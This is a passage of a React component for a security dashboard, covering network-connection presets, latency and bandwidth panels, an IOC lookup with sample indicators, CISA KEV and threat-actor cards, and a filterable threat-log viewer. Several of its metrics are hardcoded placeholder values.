                      selectedNetType === 'ethernet' ? 'bg-cyan-500 text-slate-950 font-black' : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    <Network className="w-3 h-3" />
                    <span>Ethernet</span>
                  </button>

                  <button
                    onClick={() => {
                      setSelectedNetType('hotspot');
                      networkStatusService.setNetworkType('hotspot', { networkName: "Thanvan's iPhone Hotspot", deviceName: "Thanvan's iPhone 15 Pro", hotspotDeviceIp: '172.20.10.1' });
                      handleScanNetwork('hotspot', "Thanvan's iPhone Hotspot", "Thanvan's iPhone 15 Pro", '172.20.10.1');
                    }}
                    className={`px-3 py-1 text-xs font-mono font-bold rounded-lg transition-all flex items-center gap-1.5 ${
                      selectedNetType === 'hotspot' ? 'bg-amber-400 text-slate-950 font-black' : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    <Smartphone className="w-3 h-3" />
                    <span>Hotspot</span>
                  </button>
                </div>

                <button
                  onClick={() => handleScanNetwork()}
                  disabled={isScanningNetwork}
                  className="px-3 py-1.5 bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 rounded-xl text-xs font-mono font-bold flex items-center gap-1.5 transition-all"
                >
                  <RefreshCw className={`w-3.5 h-3.5 ${isScanningNetwork ? 'animate-spin text-cyan-400' : ''}`} />
                  <span>{isScanningNetwork ? 'DETECTING...' : 'RE-SYNC'}</span>
                </button>
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3 font-mono text-xs">
              <div className="p-3.5 bg-black/30 border border-white/10 rounded-xl space-y-1.5">
                <div className="flex items-center justify-between gap-1">
                  <span className="text-[10px] text-slate-400 uppercase font-bold">CONNECTION MEDIUM</span>
                  <span className="text-[9px] px-1.5 py-0.5 rounded font-bold uppercase bg-cyan-500/10 text-cyan-400 border border-cyan-500/30">
                    {detectionModeText}
                  </span>
                </div>
                <span className="text-cyan-300 font-bold block truncate text-sm">{networkInfo.connectionType}</span>
                <span className="text-[10px] text-slate-400 block truncate">{networkInfo.interfaceName}</span>
              </div>

              <div className="p-3.5 bg-cyan-950/20 border border-cyan-400/30 rounded-xl space-y-1.5 shadow-[0_0_15px_rgba(6,182,212,0.15)]">
                <div className="flex items-center justify-between gap-1">
                  <span className="text-[10px] text-cyan-400 uppercase font-bold">HOTSPOT / DEVICE NAME</span>
                  <span className="text-[9px] text-emerald-400 font-mono font-bold">[SYNCED]</span>
                </div>
                <input
                  type="text"
                  value={customSsidName || networkInfo.ssid}
                  onChange={(e) => {
                    const val = e.target.value;
                    setCustomSsidName(val);
                    networkStatusService.setNetworkName(val);
                    networkStatusService.setDeviceName(val);
                    handleScanNetwork(undefined, val, val);
                  }}
                  placeholder="Enter Hotspot / Device Name..."
                  className="bg-black/50 border border-cyan-400/40 rounded px-2.5 py-1 text-xs text-cyan-200 font-bold w-full focus:outline-none focus:border-cyan-400 font-mono shadow-inner"
                />
                <span className="text-[10px] text-emerald-400 block truncate font-bold">
                  Device: {networkInfo.deviceName || networkInfo.hotspotDeviceName || "Thanvan's iPhone 15 Pro"}
                </span>
              </div>

              <div className="p-3.5 bg-black/30 border border-white/10 rounded-xl space-y-1.5">
                <span className="text-[10px] text-slate-400 uppercase font-bold block">GATEWAY & CLIENT IP</span>
                <div className="flex items-baseline justify-between gap-1">
                  <span className="text-[10px] text-slate-400">Host/AP:</span>
                  <span className="text-amber-300 font-bold text-xs bg-amber-500/10 px-1.5 py-0.5 rounded border border-amber-500/30">
                    {networkInfo.hotspotDeviceIp || networkInfo.gateway || '172.20.10.1'}
                  </span>
                </div>
                <div className="flex items-baseline justify-between gap-1 pt-1 border-t border-white/10">
                  <span className="text-[10px] text-slate-400">Client IP:</span>
                  <span className="text-cyan-300 font-bold text-xs truncate" title={networkInfo.webrtcCandidate || networkInfo.ipAddress}>
                    {networkInfo.webrtcCandidate || networkInfo.ipAddress}
                  </span>
                </div>
              </div>

              <div className="p-3.5 bg-black/30 border border-white/10 rounded-xl space-y-1.5">
                <span className="text-[10px] text-slate-400 uppercase font-bold block">RADIO FREQUENCY (GHZ)</span>
                <span className="text-cyan-300 font-bold block text-sm truncate">
                  {networkInfo.frequency ? networkInfo.frequency.split(' ')[0] + ' ' + (networkInfo.frequency.split(' ')[1] || 'GHz') : '5.0 GHz'}
                </span>
                <span className="text-[10px] text-slate-400 block truncate" title={networkInfo.frequency}>
                  {networkInfo.frequency || 'Wi-Fi 5GHz Band'}
                </span>
              </div>

              <div className="p-3.5 bg-black/30 border border-white/10 rounded-xl space-y-1.5">
                <span className="text-[10px] text-slate-400 uppercase font-bold block">LIVE SPEED & SIGNAL</span>
                <span className="text-emerald-300 font-bold block text-sm truncate">{networkInfo.linkSpeed}</span>
                <span className="text-[10px] text-slate-400 block truncate">Signal: {networkInfo.signalStrength}</span>
              </div>
            </div>

            <div className="flex flex-wrap items-center gap-2 pt-2 border-t border-white/10">
              <span className="text-[10px] text-slate-400 uppercase font-bold">Quick Presets:</span>
              <button
                onClick={() => {
                  setSelectedNetType('hotspot');
                  setCustomSsidName("Thanvan's iPhone Hotspot");
                  networkStatusService.setNetworkType('hotspot', {
                    networkName: "Thanvan's iPhone Hotspot",
                    deviceName: "Thanvan's iPhone 15 Pro",
                    hotspotDeviceIp: '172.20.10.1',
                    clientIp: '172.20.10.2',
                  });
                  handleScanNetwork('hotspot', "Thanvan's iPhone Hotspot", "Thanvan's iPhone 15 Pro", '172.20.10.1');
                }}
                className="px-2.5 py-1 bg-amber-500/10 hover:bg-amber-500/20 text-amber-300 border border-amber-500/30 rounded-lg text-xs font-mono transition-colors flex items-center gap-1.5"
              >
                <Smartphone className="w-3 h-3" />
                <span>Thanvan's iPhone (172.20.10.1)</span>
              </button>

              <button
                onClick={() => {
                  setSelectedNetType('hotspot');
                  setCustomSsidName('Pixel_8_5G_Tether');
                  networkStatusService.setNetworkType('hotspot', {
                    networkName: 'Pixel_8_5G_Tether',
                    deviceName: 'Pixel 8 Pro (Mobile Hotspot)',
                    hotspotDeviceIp: '192.168.43.1',
                    clientIp: '192.168.43.142',
                  });
                  handleScanNetwork('hotspot', 'Pixel_8_5G_Tether', 'Pixel 8 Pro (Mobile Hotspot)', '192.168.43.1');
                }}
                className="px-2.5 py-1 bg-amber-500/10 hover:bg-amber-500/20 text-amber-300 border border-amber-500/30 rounded-lg text-xs font-mono transition-colors flex items-center gap-1.5"
              >
                <Smartphone className="w-3 h-3" />
                <span>Pixel Hotspot (192.168.43.1)</span>
              </button>

              <button
                onClick={() => {
                  setSelectedNetType('wifi');
                  setCustomSsidName('Cyber_Home_Fiber_5G');
                  networkStatusService.setNetworkType('wifi', {
                    networkName: 'Cyber_Home_Fiber_5G',
                    deviceName: 'Wi-Fi 6 Router AP',
                    hotspotDeviceIp: '192.168.1.1',
                    clientIp: '192.168.1.104',
                  });
                  handleScanNetwork('wifi', 'Cyber_Home_Fiber_5G', 'Wi-Fi 6 Router AP', '192.168.1.1');
                }}
                className="px-2.5 py-1 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 rounded-lg text-xs font-mono transition-colors flex items-center gap-1.5"
              >
                <Wifi className="w-3 h-3" />
                <span>Home Fiber (192.168.1.1)</span>
              </button>

              <button
                onClick={() => {
                  setSelectedNetType('ethernet');
                  setCustomSsidName('Gigabit_Ethernet_LAN');
                  networkStatusService.setNetworkType('ethernet', {
                    networkName: 'Gigabit_Ethernet_LAN',
                    deviceName: 'Cisco Gigabit LAN Gateway',
                    hotspotDeviceIp: '10.0.0.1',
                    clientIp: '10.0.0.15',
                  });
                  handleScanNetwork('ethernet', 'Gigabit_Ethernet_LAN', 'Cisco Gigabit LAN Gateway', '10.0.0.1');
                }}
                className="px-2.5 py-1 bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 rounded-lg text-xs font-mono transition-colors flex items-center gap-1.5"
              >
                <Network className="w-3 h-3" />
                <span>Gigabit LAN (10.0.0.1)</span>
              </button>
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
            <div className="bg-[#060e22]/55 backdrop-blur-2xl border border-white/10 p-4 rounded-2xl space-y-3 shadow-[0_8px_32px_rgba(0,0,0,0.4)]">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Activity className="w-4 h-4 text-cyan-400" />
                  <span className="text-xs font-bold text-white font-mono uppercase">Packet RTT Latency</span>
                </div>
                <span className="text-sm font-black font-mono text-cyan-300">
                  {currentPingMs} ms
                </span>
              </div>

              <div className="h-16 flex items-end gap-1.5 px-2 py-1 bg-black/40 border border-white/10 rounded-xl overflow-hidden">
                {latencyHistory.map((val, idx) => {
                  const heightPercent = Math.min(100, Math.max(15, (val / 50) * 100));
                  return (
                    <div
                      key={idx}
                      className="flex-1 rounded-t transition-all duration-300 bg-gradient-to-t from-cyan-600/40 to-cyan-400"
                      style={{ height: `${heightPercent}%` }}
                      title={`${val} ms`}
                    />
                  );
                })}
              </div>

              <div className="grid grid-cols-3 gap-2 font-mono text-[10px] text-slate-400 pt-1">
                <div>
                  <span className="block text-slate-500">AVG PING</span>
                  <span className="font-bold text-white">22.4 ms</span>
                </div>
                <div>
                  <span className="block text-slate-500">JITTER</span>
                  <span className="font-bold text-emerald-400">1.2 ms</span>
                </div>
                <div>
                  <span className="block text-slate-500">LOSS</span>
                  <span className="font-bold text-emerald-400">0.00%</span>
                </div>
              </div>
            </div>

            <div className="bg-[#060e22]/55 backdrop-blur-2xl border border-white/10 p-4 rounded-2xl space-y-3 shadow-[0_8px_32px_rgba(0,0,0,0.4)]">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <RadioTower className="w-4 h-4 text-emerald-400" />
                  <span className="text-xs font-bold text-white font-mono uppercase">Bandwidth Throughput</span>
                </div>
                <span className="text-[10px] font-mono text-slate-400">5G CELLULAR</span>
              </div>

              <div className="grid grid-cols-2 gap-3 pt-1">
                <div className="p-2.5 bg-black/30 border border-white/10 rounded-xl space-y-1">
                  <div className="flex items-center justify-between text-slate-400 text-[10px] font-mono">
                    <span className="flex items-center gap-1 text-emerald-400 font-bold">
                      <ArrowDownRight className="w-3.5 h-3.5" /> RX (DOWN)
                    </span>
                    <span>154.2 Mbps</span>
                  </div>
                  <div className="w-full h-2 bg-slate-800 rounded-full overflow-hidden">
                    <div className="w-[78%] h-full bg-gradient-to-r from-emerald-500 to-cyan-400 rounded-full animate-pulse" />
                  </div>
                </div>

                <div className="p-2.5 bg-black/30 border border-white/10 rounded-xl space-y-1">
                  <div className="flex items-center justify-between text-slate-400 text-[10px] font-mono">
                    <span className="flex items-center gap-1 text-cyan-400 font-bold">
                      <ArrowUpRight className="w-3.5 h-3.5" /> TX (UP)
                    </span>
                    <span>38.6 Mbps</span>
                  </div>
                  <div className="w-full h-2 bg-slate-800 rounded-full overflow-hidden">
                    <div className="w-[45%] h-full bg-gradient-to-r from-cyan-500 to-blue-400 rounded-full animate-pulse" />
                  </div>
                </div>
              </div>

              <div className="flex items-center justify-between text-[10px] font-mono text-slate-400 pt-1 border-t border-white/10">
                <span>Session Data Meter:</span>
                <span className="font-bold text-cyan-300">2.45 GB Transferred</span>
              </div>
            </div>

            <div className="bg-[#060e22]/55 backdrop-blur-2xl border border-white/10 p-4 rounded-2xl space-y-2.5 shadow-[0_8px_32px_rgba(0,0,0,0.4)]">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4 text-cyan-400" />
                  <span className="text-xs font-bold text-white font-mono uppercase">Local Port Shield</span>
                </div>
                <span className="text-[10px] font-mono text-emerald-400 font-bold">6/6 MONITORED</span>
              </div>

              <div className="space-y-1 font-mono text-[10px]">
                <div className="flex items-center justify-between p-1.5 bg-black/30 rounded-lg border border-white/5">
                  <span className="text-slate-300 font-bold">Port 3000 (Node API)</span>
                  <span className="text-emerald-400 bg-emerald-500/10 px-1.5 py-0.2 rounded border border-emerald-500/30">
                    ACTIVE / SECURED
                  </span>
                </div>
                <div className="flex items-center justify-between p-1.5 bg-black/30 rounded-lg border border-white/5">
                  <span className="text-slate-300 font-bold">Port 443 (TLS HTTPS)</span>
                  <span className="text-emerald-400 bg-emerald-500/10 px-1.5 py-0.2 rounded border border-emerald-500/30">
                    TLS 1.3 ENCRYPTED
                  </span>
                </div>
                <div className="flex items-center justify-between p-1.5 bg-black/30 rounded-lg border border-white/5">
                  <span className="text-slate-300 font-bold">Port 22 (SSH Listener)</span>
                  <span className="text-amber-400 bg-amber-500/10 px-1.5 py-0.2 rounded border border-amber-500/30">
                    FILTERED / KEY-ONLY
                  </span>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {activeMode === 'threatintel' && (
        <div className="space-y-5">
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            <div className="p-4 bg-[#060e22]/55 backdrop-blur-2xl border border-white/10 rounded-2xl space-y-1 shadow-[0_8px_32px_rgba(0,0,0,0.4)]">
              <span className="text-[10px] font-mono text-slate-400 uppercase font-bold">GLOBAL DEFENSE STATUS</span>
              <div className="text-xl font-extrabold text-emerald-400 flex items-center gap-1.5">
                <span>SHIELD ACTIVE</span>
              </div>
              <span className="text-[10px] text-slate-400 font-mono">Continuous perimeter heuristics</span>
            </div>

            <div className="p-4 bg-[#060e22]/55 backdrop-blur-2xl border border-rose-500/30 rounded-2xl space-y-1 shadow-[0_8px_32px_rgba(0,0,0,0.4)]">
              <span className="text-[10px] font-mono text-rose-400 uppercase font-bold">BLOCKED ATTACKS (24H)</span>
              <div className="text-xl font-extrabold text-white flex items-center gap-1.5">
                <span>2,841</span>
                <span className="text-xs text-rose-400 font-mono font-bold">+18.4%</span>
              </div>
              <span className="text-[10px] text-slate-400 font-mono">Deflected edge vectors</span>
            </div>

            <div className="p-4 bg-[#060e22]/55 backdrop-blur-2xl border border-white/10 rounded-2xl space-y-1 shadow-[0_8px_32px_rgba(0,0,0,0.4)]">
              <span className="text-[10px] font-mono text-slate-400 uppercase font-bold">ACTIVE ZERO-DAYS TRACKED</span>
              <div className="text-xl font-extrabold text-amber-400 flex items-center gap-1.5">
                <span>4 CISA KEV</span>
              </div>
              <span className="text-[10px] text-slate-400 font-mono">With active exploit signatures</span>
            </div>

            <div className="p-4 bg-[#060e22]/55 backdrop-blur-2xl border border-white/10 rounded-2xl space-y-1 shadow-[0_8px_32px_rgba(0,0,0,0.4)]">
              <span className="text-[10px] font-mono text-slate-400 uppercase font-bold">TOP ATTACK VECTORS</span>
              <div className="text-sm font-bold text-cyan-300 truncate">
                Credential Stuffing (38%)
              </div>
              <span className="text-[10px] text-slate-400 font-mono">Followed by SQLi (27%) & RCE (19%)</span>
            </div>
          </div>

          <div className="bg-[#060e22]/55 backdrop-blur-2xl border border-white/10 p-5 rounded-2xl space-y-4 shadow-[0_8px_32px_rgba(0,0,0,0.4)]">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-2 border-b border-white/10 pb-3">
              <div className="flex items-center gap-2.5">
                <div className="p-2 bg-rose-500/10 border border-rose-500/30 rounded-xl text-rose-400">
                  <Crosshair className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="font-bold text-white text-sm">
                    IOC Indicator of Compromise & Threat Reputation Lookup
                  </h3>
                  <p className="text-xs text-slate-400">
                    Query suspect IP addresses, hashes, CVE identifiers, or domains against global threat intelligence feeds.
                  </p>
                </div>
              </div>

              <div className="flex items-center gap-1.5 flex-wrap">
                <span className="text-[10px] font-mono text-slate-500 uppercase">Test:</span>
                <button
                  onClick={() => {
                    setIocSearchInput('185.220.101.42');
                    handleExecuteIocLookup('185.220.101.42');
                  }}
                  className="px-2 py-0.5 bg-black/40 hover:bg-white/10 text-cyan-300 border border-white/10 rounded text-[10px] font-mono"
                >
                  185.220.101.42 (Tor Exit)
                </button>
                <button
                  onClick={() => {
                    setIocSearchInput('45.154.255.89');
                    handleExecuteIocLookup('45.154.255.89');
                  }}
                  className="px-2 py-0.5 bg-black/40 hover:bg-white/10 text-rose-300 border border-white/10 rounded text-[10px] font-mono"
                >
                  45.154.255.89 (Mirai)
                </button>
                <button
                  onClick={() => {
                    setIocSearchInput('CVE-2024-3400');
                    handleExecuteIocLookup('CVE-2024-3400');
                  }}
                  className="px-2 py-0.5 bg-black/40 hover:bg-white/10 text-amber-300 border border-white/10 rounded text-[10px] font-mono"
                >
                  CVE-2024-3400
                </button>
              </div>
            </div>

            <div className="flex items-center gap-2">
              <div className="relative flex-1">
                <Search className="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
                <input
                  type="text"
                  value={iocSearchInput}
                  onChange={(e) => setIocSearchInput(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && handleExecuteIocLookup(iocSearchInput)}
                  placeholder="Enter IP (e.g. 185.220.101.42), domain, SHA256 hash, or CVE..."
                  className="w-full bg-black/50 border border-white/15 rounded-xl pl-9 pr-4 py-2.5 text-xs text-white placeholder:text-slate-500 font-mono focus:outline-none focus:border-cyan-400"
                />
              </div>
              <button
                onClick={() => handleExecuteIocLookup(iocSearchInput)}
                className="px-4 py-2.5 bg-gradient-to-r from-rose-500 to-red-600 hover:from-rose-600 hover:to-red-700 text-white rounded-xl text-xs font-mono font-bold transition-all shadow-[0_0_15px_rgba(244,63,94,0.3)] shrink-0 flex items-center gap-1.5"
              >
                <Crosshair className="w-3.5 h-3.5" />
                <span>QUERY IOC</span>
              </button>
            </div>

            {iocResult && (
              <div className="p-4 bg-black/40 border border-white/10 rounded-xl space-y-3 font-mono text-xs">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-white/10 pb-3">
                  <div className="flex items-center gap-2">
                    <span className="px-2 py-0.5 rounded font-bold text-[10px] bg-rose-500/20 text-rose-400 border border-rose-500/30">
                      {iocResult.verdict} ({iocResult.riskScore}/100)
                    </span>
                    <span className="font-bold text-white text-sm">{iocResult.query}</span>
                    <span className="text-slate-400 text-[10px]">[{iocResult.type}]</span>
                  </div>
                  <span className="text-slate-500 text-[10px]">
                    Reports: {iocResult.reports} community detections &middot; Seen: {iocResult.lastSeen}
                  </span>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 text-[11px]">
                  <div>
                    <span className="text-slate-500 block text-[10px]">ASN & ROUTE:</span>
                    <span className="text-cyan-300 font-bold block truncate">{iocResult.asn}</span>
                  </div>
                  <div>
                    <span className="text-slate-500 block text-[10px]">GEO LOCATION:</span>
                    <span className="text-slate-200 font-bold block">{iocResult.location}</span>
                  </div>
                  <div>
                    <span className="text-slate-500 block text-[10px]">ATTRIBUTION:</span>
                    <span className="text-amber-300 font-bold block truncate">{iocResult.threatActor}</span>
                  </div>
                  <div>
                    <span className="text-slate-500 block text-[10px]">MALWARE FAMILY:</span>
                    <span className="text-rose-400 font-bold block truncate">{iocResult.malwareFamily}</span>
                  </div>
                </div>
              </div>
            )}
          </div>

          <div className="bg-[#060e22]/55 backdrop-blur-2xl border border-white/10 p-5 rounded-2xl space-y-4 shadow-[0_8px_32px_rgba(0,0,0,0.4)]">
            <div className="flex items-center justify-between border-b border-white/10 pb-3">
              <div className="flex items-center gap-2.5">
                <Flame className="w-5 h-5 text-amber-400" />
                <h3 className="font-bold text-white text-sm">
                  CISA Known Exploited Vulnerabilities (KEV) Radar
                </h3>
              </div>
              <span className="text-xs font-mono text-cyan-300">
                ACTIVE IN-THE-WILD FEEDS
              </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 font-mono">
              {KNOWN_EXPLOITED_VULNS.map((cve) => (
                <div
                  key={cve.id}
                  className="p-3.5 bg-black/40 border border-white/10 hover:border-cyan-400/40 rounded-xl space-y-2 transition-all"
                >
                  <div className="flex items-center justify-between gap-2">
                    <span className="font-bold text-cyan-300 text-xs">{cve.id}</span>
                    <div className="flex items-center gap-1.5">
                      <span className="px-1.5 py-0.2 rounded text-[9px] font-bold bg-rose-500/20 text-rose-300 border border-rose-500/30">
                        CVSS {cve.cvss}
                      </span>
                      <span className="px-1.5 py-0.2 rounded text-[9px] font-bold bg-amber-500/20 text-amber-300 border border-amber-500/30">
                        {cve.status}
                      </span>
                    </div>
                  </div>

                  <div className="font-bold text-white text-xs font-sans">
                    {cve.name}
                  </div>

                  <p className="text-[11px] text-slate-400 font-sans line-clamp-2">
                    {cve.description}
                  </p>

                  <div className="pt-2 border-t border-white/10 text-[10px] text-slate-400">
                    <span className="text-emerald-400 font-bold">Fix: </span>
                    <span>{cve.patch}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className="bg-[#060e22]/55 backdrop-blur-2xl border border-white/10 p-5 rounded-2xl space-y-4 shadow-[0_8px_32px_rgba(0,0,0,0.4)]">
            <div className="flex items-center justify-between border-b border-white/10 pb-3">
              <div className="flex items-center gap-2.5">
                <Globe className="w-5 h-5 text-cyan-400" />
                <h3 className="font-bold text-white text-sm">
                  Active Nation-State & Syndicate Threat Actor Dossiers
                </h3>
              </div>
              <span className="text-xs font-mono text-slate-400">
                MITRE ATT&CK FRAMEWORK
              </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 font-mono">
              {THREAT_ACTORS.map((actor) => (
                <div
                  key={actor.name}
                  className="p-3.5 bg-black/40 border border-white/10 rounded-xl space-y-2 text-xs"
                >
                  <div className="flex items-center justify-between gap-2">
                    <div>
                      <span className="font-bold text-white text-sm">{actor.name}</span>
                      <span className="text-[10px] text-slate-400 block truncate">{actor.alias}</span>
                    </div>
                    <span className={`px-2 py-0.5 rounded text-[9px] font-bold border ${
                      actor.activeStatus === 'CRITICAL'
                        ? 'bg-red-500/20 text-red-400 border-red-500/30'
                        : 'bg-amber-500/20 text-amber-400 border-amber-500/30'
                    }`}>
                      {actor.activeStatus}
                    </span>
                  </div>

                  <div className="space-y-1 text-[11px] font-sans">
                    <div className="text-slate-300">
                      <strong className="text-slate-500 font-mono text-[10px] uppercase">Targets: </strong>
                      {actor.targets}
                    </div>
                    <div className="text-slate-300">
                      <strong className="text-slate-500 font-mono text-[10px] uppercase">Primary TTPs: </strong>
                      {actor.ttp}
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      <div className="bg-[#060e22]/55 backdrop-blur-2xl border border-white/10 rounded-2xl p-5 space-y-4 font-mono text-xs shadow-[0_8px_32px_rgba(0,0,0,0.4)] relative overflow-hidden">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 border-b border-white/10 pb-3">
          <div className="flex items-center gap-3">
            <div className="relative flex items-center justify-center">
              <Radio className={`w-5 h-5 ${isLive ? 'text-cyan-400 animate-pulse' : 'text-slate-500'}`} />
              {isLive && <span className="absolute -top-1 -right-1 w-2 h-2 rounded-full bg-emerald-400 animate-ping" />}
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="font-bold text-white uppercase tracking-wider text-xs font-mono">
                  Live Threat Telemetry & Audit Stream
                </span>
                <span className="px-2 py-0.5 bg-cyan-500/10 border border-cyan-500/20 text-cyan-400 text-[10px] rounded-md font-bold">
                  {filteredLogs.length} EVENTS
                </span>
              </div>
              <p className="text-[10px] text-slate-400 font-sans mt-0.5">
                Real-time security telemetry feed, SAST AST execution logs & HTTP threat inspection.
              </p>
            </div>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            <button
              onClick={() => setIsLive(!isLive)}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-xl text-[11px] font-bold transition-all border ${
                isLive
                  ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30 hover:bg-emerald-500/20'
                  : 'bg-amber-500/10 text-amber-400 border-amber-500/30 hover:bg-amber-500/20'
              }`}
            >
              {isLive ? (
                <>
                  <Pause className="w-3 h-3 fill-current" />
                  <span>STREAM LIVE</span>
                </>
              ) : (
                <>
                  <Play className="w-3 h-3 fill-current" />
                  <span>PAUSED</span>
                </>
              )}
            </button>

            <button
              onClick={handleExportLogs}
              title="Export JSON Logs"
              className="p-2 bg-black/40 hover:bg-white/10 text-slate-300 border border-white/10 rounded-xl transition-all"
            >
              <Download className="w-3.5 h-3.5" />
            </button>

            <button
              onClick={handleClearLogs}
              title="Clear Log Terminal"
              className="p-2 bg-black/40 hover:bg-red-500/20 text-slate-300 hover:text-red-400 border border-white/10 hover:border-red-500/40 rounded-xl transition-all"
            >
              <Trash2 className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>

        <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3">
          <div className="relative flex-1">
            <Search className="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Filter by vulnerability (e.g. CWE-89, SQL, injection, path)..."
              className="w-full bg-black/50 border border-white/10 rounded-xl pl-9 pr-4 py-2 text-xs text-white placeholder:text-slate-500 focus:outline-none focus:border-cyan-400"
            />
          </div>

          <div className="flex items-center gap-1.5 overflow-x-auto pb-1 sm:pb-0">
            {(['ALL', 'CRITICAL', 'WARN', 'SAST', 'HTTP', 'EXPLOIT'] as const).map((cat) => (
              <button
                key={cat}
                onClick={() => setSelectedCategory(cat)}
                className={`px-2.5 py-1 text-[10px] font-bold rounded-lg border transition-all ${
                  selectedCategory === cat
                    ? 'bg-cyan-500/20 border-cyan-400/50 text-cyan-300'
                    : 'bg-black/30 border-white/10 text-slate-400 hover:text-white'
                }`}
              >
                {cat}
              </button>
            ))}
          </div>
        </div>

        <div className="space-y-2 max-h-[480px] overflow-y-auto scrollbar-none pr-1">
          {filteredLogs.length === 0 ? (
            <div className="py-8 text-center text-slate-500 text-xs font-mono">
              No live telemetry events matching filter criteria.
            </div>
          ) : (
            filteredLogs.map((log) => {
              const isExpanded = expandedLogId === log.id;

              return (
                <div
                  key={log.id}
                  className={`rounded-xl border transition-all ${
                    log.type === 'CRITICAL'
                      ? 'bg-red-500/5 border-red-500/20 hover:border-red-500/40'
                      : log.type === 'WARN'
                      ? 'bg-amber-500/5 border-amber-500/20 hover:border-amber-500/40'
                      : log.type === 'SUCCESS'
                      ? 'bg-emerald-500/5 border-emerald-500/20 hover:border-emerald-500/40'
                      : 'bg-black/30 border-white/10 hover:border-white/20'
                  }`}
                >
                  <div
                    onClick={() => setExpandedLogId(isExpanded ? null : log.id)}
                    className="p-3 flex items-center justify-between cursor-pointer gap-2 select-none"
                  >
                    <div className="flex items-center gap-2.5 min-w-0">
                      <span className="text-[10px] text-slate-500 font-mono shrink-0">
                        {log.timestamp}
                      </span>

                      <span
                        className={`text-[9px] font-bold px-1.5 py-0.5 rounded uppercase font-mono shrink-0 ${
                          log.type === 'CRITICAL'
                            ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                            : log.type === 'WARN'
                            ? 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                            : log.type === 'SUCCESS'
                            ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                            : 'bg-cyan-500/20 text-cyan-400 border border-cyan-500/30'
                        }`}
                      >
                        {log.category}
                      </span>

                      <span className="text-[9px] text-slate-400 font-mono bg-white/5 px-1.5 py-0.5 rounded shrink-0 hidden sm:inline">
                        {log.cwe}
                      </span>

                      <span className="text-[11px] text-slate-200 truncate font-mono">
                        {log.message}
                      </span>
                    </div>

                    <div className="flex items-center gap-2 shrink-0">
                      <span className="text-[10px] text-slate-500 font-mono hidden md:inline truncate max-w-[140px]">
                        {log.targetModule}
                      </span>
                      {isExpanded ? (
                        <ChevronUp className="w-3.5 h-3.5 text-slate-400" />
                      ) : (
                        <ChevronDown className="w-3.5 h-3.5 text-slate-500" />
                      )}
                    </div>
                  </div>

                  {isExpanded && (
                    <div className="p-3.5 bg-black/50 border-t border-white/10 rounded-b-xl text-[11px] space-y-2.5 font-sans animate-in fade-in">
                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-slate-300 font-mono text-[10px]">
                        <div>
                          <span className="text-slate-500 block">Target Module:</span>
                          <span className="text-cyan-400 font-bold">{log.targetModule}</span>
                        </div>
                        <div>
                          <span className="text-slate-500 block">OWASP Pillar:</span>
                          <span className="text-amber-400">{log.owaspCategory}</span>
                        </div>
                        <div>
                          <span className="text-slate-500 block">Source IP:</span>
                          <span className="text-slate-300">{log.sourceIp}</span>
                        </div>
                        <div>
                          <span className="text-slate-500 block">Classification:</span>
                          <span className={log.type === 'CRITICAL' ? 'text-red-400 font-bold' : log.type === 'WARN' ? 'text-amber-400' : 'text-emerald-400'}>
                            {log.type} SEVERITY
                          </span>
                        </div>
                      </div>

                      {log.payloadSnippet && (
                        <div className="space-y-1">
                          <span className="text-[10px] text-slate-500 font-mono block">
                            Payload Snippet / Vector:
                          </span>
                          <div className="bg-black/60 p-2.5 rounded-lg border border-white/10 font-mono text-[11px] text-amber-300 overflow-x-auto">
                            {log.payloadSnippet}
                          </div>
                        </div>
                      )}

                      {log.remediationAction && (
                        <div className="p-2.5 bg-cyan-950/40 border border-cyan-800/40 rounded-lg text-cyan-300 text-[11px] flex items-start gap-2">
                          <CheckCircle2 className="w-4 h-4 text-cyan-400 shrink-0 mt-0.5" />
                          <div>
                            <strong className="block text-cyan-400 text-[10px] font-mono uppercase">
                              Remediation Blueprint:
                            </strong>
                            <span>{log.remediationAction}</span>
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              );
            })
          )}
        </div>
      </div>
    </div>
  );
};
